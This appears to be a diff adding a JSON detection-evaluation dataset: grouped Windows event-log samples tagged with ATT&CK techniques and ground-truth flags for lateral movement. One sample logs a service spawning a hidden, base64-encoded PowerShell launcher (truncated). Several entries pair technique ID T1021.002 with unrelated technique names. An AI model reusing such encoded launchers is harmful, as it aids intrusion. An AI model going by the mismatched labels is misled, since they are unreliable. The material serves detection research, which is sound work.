+        "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:18:02.069000+00:00"
+      },
+      "num_events": 3,
+      "event_id_distribution": {
+        "13": 2,
+        "23": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 3866,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:18:02.069000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\NdisCap\\Parameters\\RefCount"
+        },
+        {
+          "idx": 3867,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:18:02.070000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\.DEFAULT\\System\\CurrentControlSet\\Control\\NetTrace\\Session\\CaptureEnabled"
+        },
+        {
+          "idx": 3994,
+          "EventID": 23,
+          "TimeCreated": "2020-09-20 16:18:02.139000+00:00",
+          "Image": "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1654.1\\NetworkWatcherAgent\\NetworkWatc",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Modify Registry",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:c=0,no-kw,rule!=fam(T1112)"
+    },
+    {
+      "group_id": "T1134_527",
+      "rule_technique_id": "T1134",
+      "rule_technique_name": "Access Token Manipulation",
+      "confidence": 0.67,
+      "anchor": {
+        "idx": 527,
+        "EventID": 4673,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:16:40.736000+00:00"
+      },
+      "num_events": 887,
+      "event_id_distribution": {
+        "10": 878,
+        "1": 6,
+        "4673": 3
+      },
+      "sample_logs": [
+        {
+          "idx": 311,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:33.597000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 350,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.620000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 351,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.620000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 353,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.621000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 362,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:39.626000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "\"C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe\" /frequentupdate SCHEDULEDTASK displaylevel=False",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 363,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.627000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 364,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.627000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 403,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.652000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 405,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.652000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 433,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.668000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 434,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.669000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 477,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.696000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 478,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.697000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 482,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.699000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 483,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:39.700000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Access Token Manipulation",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:no-kw,rule!=fam(T1134)"
+    },
+    {
+      "group_id": "T1543_003_1212",
+      "rule_technique_id": "T1543.003",
+      "rule_technique_name": "Windows Service",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 1212,
+        "EventID": 4697,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:16:58.214000+00:00"
+      },
+      "num_events": 17,
+      "event_id_distribution": {
+        "11": 10,
+        "1": 5,
+        "4697": 1,
+        "7045": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 821,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:16:50.914000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 822,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:16:50.914000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 849,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:16:52.933000+00:00",
+          "Image": "C:\\windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1056,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:57.114000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqA",
+          "ParentImage": "C:\\Windows\\System32\\services.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1072,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:57.124000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell  -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABl",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1083,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:16:57.130000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1086,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:57.132000+00:00",
+          "Image": "C:\\Windows\\System32\\conhost.exe",
+          "CommandLine": "\\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1212,
+          "EventID": 4697,
+          "TimeCreated": "2020-09-20 16:16:58.214000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1250,
+          "EventID": 7045,
+          "TimeCreated": "2020-09-20 16:16:58.233000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1637,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:17:01.457000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1638,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:17:01.457000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2468,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:17:03.998000+00:00",
+          "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "CommandLine": "C:\\windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2651,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:17:08.092000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2652,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:17:08.093000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2764,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:17:15.156000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Windows Service",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: sample-kw+ctx(T1543.003,c=1.00)"
+    }
+  ]
+}
